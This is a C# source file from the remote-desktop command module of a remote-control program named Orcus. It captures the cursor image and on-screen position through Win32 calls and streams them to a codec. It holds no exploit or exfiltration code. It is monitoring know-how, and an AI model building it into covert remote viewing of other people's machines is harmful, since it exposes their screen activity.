using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Orcus.Native;
using Orcus.Shared.Utilities.Compression;

namespace Orcus.Commands.RemoteDesktop
{
    public class ScreenHelper
    {
        private IntPtr _lastCursorHandle;
        private int _screenNumber;
        private Screen _screenInfo;
        private int _cursorHotspotX;
        private int _cursorHotspotY;

        // ReSharper disable once InconsistentNaming
        private const int CURSOR_SHOWING = 0x00000001;

        public static Bitmap CaptureCursor(out int x, out int y)
        {
            x = 0;
            y = 0;

            var cursorInfo = new CURSORINFO();
            cursorInfo.cbSize = Marshal.SizeOf(cursorInfo);
            if (!NativeMethods.GetCursorInfo(out cursorInfo))
                return null;

            if (cursorInfo.flags != CURSOR_SHOWING)
                return null;

            ICONINFO iconInfo;
            var bitmap = GetCursorImage(cursorInfo, out iconInfo);

            x = cursorInfo.ptScreenPos.x - iconInfo.xHotspot;
            y = cursorInfo.ptScreenPos.y - iconInfo.yHotspot;
            return bitmap;
        }

        private static Bitmap GetCursorImage(CURSORINFO cursorInfo, out ICONINFO iconInfo)
        {
            var hicon = NativeMethods.CopyIcon(cursorInfo.hCursor);
            if (hicon == IntPtr.Zero)
            {
                iconInfo = default(ICONINFO);
                return null;
            }

            if (!NativeMethods.GetIconInfo(hicon, out iconInfo))
                return null;

            try
            {
                using (var maskBitmap = Image.FromHbitmap(iconInfo.hbmMask))
                {
                    // Is this a monochrome cursor?
                    if (maskBitmap.Height == maskBitmap.Width * 2)
                    {
                        var resultBitmap = new Bitmap(maskBitmap.Width, maskBitmap.Width);
                        using (var desktopGraphics = Graphics.FromHwnd(NativeMethods.GetDesktopWindow()))
                        {
                            var desktopHdc = desktopGraphics.GetHdc();
                            var maskHdc = NativeMethods.CreateCompatibleDC(desktopHdc);
                            var hdbit = maskBitmap.GetHbitmap();
                            var oldPtr = NativeMethods.SelectObject(maskHdc, hdbit);

                            using (var resultGraphics = Graphics.FromImage(resultBitmap))
                            {
                                var resultHdc = resultGraphics.GetHdc();
                                // These two operation will result in a black cursor over a white background.
                                // Later in the code, a call to MakeTransparent() will get rid of the white background.
                                NativeMethods.BitBlt(resultHdc, 0, 0, 32, 32, maskHdc, 0, 32,
                                    TernaryRasterOperations.SRCCOPY);
                                NativeMethods.BitBlt(resultHdc, 0, 0, 32, 32, maskHdc, 0, 0,
                                    TernaryRasterOperations.SRCINVERT);
                                resultGraphics.ReleaseHdc(resultHdc);
                            }
                            var newPtr = NativeMethods.SelectObject(maskHdc, oldPtr);
                            NativeMethods.DeleteDC(newPtr);
                            NativeMethods.DeleteObject(hdbit);
                            NativeMethods.DeleteDC(maskHdc);
                            NativeMethods.DestroyIcon(hicon);
                            desktopGraphics.ReleaseHdc(desktopHdc);
                        }

                        // Remove the white background from the BitBlt calls,
                        // resulting in a black cursor over a transparent background.
                        resultBitmap.MakeTransparent(Color.White);
                        return resultBitmap;
                    }
                }
            }
            finally
            {
                NativeMethods.DeleteObject(iconInfo.hbmColor);
                NativeMethods.DeleteObject(iconInfo.hbmMask);
            }

            using (var icon = Icon.FromHandle(hicon))
            {
                var bitmap = icon.ToBitmap();
                NativeMethods.DestroyIcon(hicon);
                return bitmap;
            }
        }

        public void UpdateCursor(ICursorStreamCodec cursorStreamCodec, int screenNumber)
        {
            var cursorInfo = new CURSORINFO();
            cursorInfo.cbSize = Marshal.SizeOf(cursorInfo);
            if (!NativeMethods.GetCursorInfo(out cursorInfo))
                return;

            if (screenNumber != _screenNumber || _screenInfo == null)
            {
                _screenNumber = screenNumber;
                _screenInfo = Screen.AllScreens[screenNumber];
            }

            if (cursorInfo.hCursor != _lastCursorHandle || !cursorStreamCodec.HasCursorImage)
            {
                ICONINFO iconinfo;
                var cursorImage = GetCursorImage(cursorInfo, out iconinfo);
                if (cursorImage != null)
                    cursorStreamCodec.UpdateCursorImage(cursorImage);

                _cursorHotspotX = iconinfo.xHotspot;
                _cursorHotspotY = iconinfo.yHotspot;
                _lastCursorHandle = cursorInfo.hCursor;
                Debug.Print("Update Cursor Image");
            }

            var cursorX = cursorInfo.ptScreenPos.x - _cursorHotspotX;
            var cursorY = cursorInfo.ptScreenPos.y - _cursorHotspotY;

            var isShowing = cursorInfo.flags == CURSOR_SHOWING && _screenInfo.Bounds.Contains(cursorX, cursorY);

            cursorX = cursorX - _screenInfo.Bounds.X;
            cursorY = cursorY - _screenInfo.Bounds.Y;

            cursorStreamCodec.UpdateCursorInfo(cursorX, cursorY, isShowing);
        }
    }
}